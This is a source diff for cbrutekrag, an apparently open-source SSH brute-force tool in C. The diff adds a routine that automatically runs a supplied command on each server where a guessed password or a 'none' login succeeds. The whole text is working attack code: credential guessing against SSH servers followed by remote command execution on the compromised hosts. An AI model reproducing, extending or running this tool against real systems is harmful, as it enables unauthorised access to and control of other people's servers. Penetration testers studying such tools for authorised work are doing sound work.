@@ -23,11 +23,10 @@ SOFTWARE.
 #include <libssh/libssh.h>
 #include <stdio.h>
 
+#include "bruteforce_ssh.h"
 #include "cbrutekrag.h"
 #include "log.h"
 #include "progressbar.h"
-
-int g_timeout;
 
 int bruteforce_ssh_login(btkg_context_t* context, const char* hostname, unsigned int port, const char* username,
     const char* password)
@@ -55,7 +54,7 @@ int bruteforce_ssh_login(btkg_context_t* context, const char* hostname, unsigned
     ssh_options_set(my_ssh_session, SSH_OPTIONS_KEY_EXCHANGE, "none");
     ssh_options_set(my_ssh_session, SSH_OPTIONS_HOSTKEYS, "none");
 #endif
-    ssh_options_set(my_ssh_session, SSH_OPTIONS_TIMEOUT, &g_timeout);
+    ssh_options_set(my_ssh_session, SSH_OPTIONS_TIMEOUT, &context->timeout);
     ssh_options_set(my_ssh_session, SSH_OPTIONS_USER, username);
 
     int r;
@@ -69,6 +68,9 @@ int bruteforce_ssh_login(btkg_context_t* context, const char* hostname, unsigned
     }
 
     r = ssh_userauth_none(my_ssh_session, username);
+    if (r == SSH_AUTH_SUCCESS && context->command != NULL) {
+        bruteforce_ssh_execute_command(my_ssh_session, context->command);
+    }
     if (r == SSH_AUTH_SUCCESS || r == SSH_AUTH_ERROR) {
         ssh_disconnect(my_ssh_session);
         ssh_free(my_ssh_session);
@@ -82,6 +84,9 @@ int bruteforce_ssh_login(btkg_context_t* context, const char* hostname, unsigned
     if (method & SSH_AUTH_METHOD_NONE) {
         r = ssh_userauth_none(my_ssh_session, NULL);
         if (r == SSH_AUTH_SUCCESS) {
+            if (context->command != NULL) {
+                bruteforce_ssh_execute_command(my_ssh_session, context->command);
+            }
             ssh_disconnect(my_ssh_session);
             ssh_free(my_ssh_session);
             return r;
@@ -91,6 +96,9 @@ int bruteforce_ssh_login(btkg_context_t* context, const char* hostname, unsigned
     if (method & SSH_AUTH_METHOD_PASSWORD) {
         r = ssh_userauth_password(my_ssh_session, NULL, password);
         if (r == SSH_AUTH_SUCCESS) {
+            if (context->command != NULL) {
+                bruteforce_ssh_execute_command(my_ssh_session, context->command);
+            }
             ssh_disconnect(my_ssh_session);
             ssh_free(my_ssh_session);
             return r;
@@ -122,5 +130,36 @@ int bruteforce_ssh_try_login(btkg_context_t* context, const char* hostname, cons
         progressbar_render(count, total, bar_suffix, -1);
     }
 
+    return ret;
+}
+
+int bruteforce_ssh_execute_command(ssh_session session, const char* command)
+{
+    ssh_channel channel;
+    int ret;
+
+    channel = ssh_channel_new(session);
+
+    if (channel == NULL) {
+        return SSH_ERROR;
+    }
+
+    ret = ssh_channel_open_session(channel);
+    if (ret != SSH_OK) {
+        log_error("Cannot open channel.");
+        ssh_channel_free(channel);
+        return ret;
+    }
+
+    ret = ssh_channel_request_exec(channel, command);
+    if (ret != SSH_OK) {
+        log_error("Cannot execute command.");
+        ssh_channel_close(channel);
+        ssh_channel_free(channel);
+        return ret;
+    }
+
+    ssh_channel_close(channel);
+    ssh_channel_free(channel);
     return ret;
 }
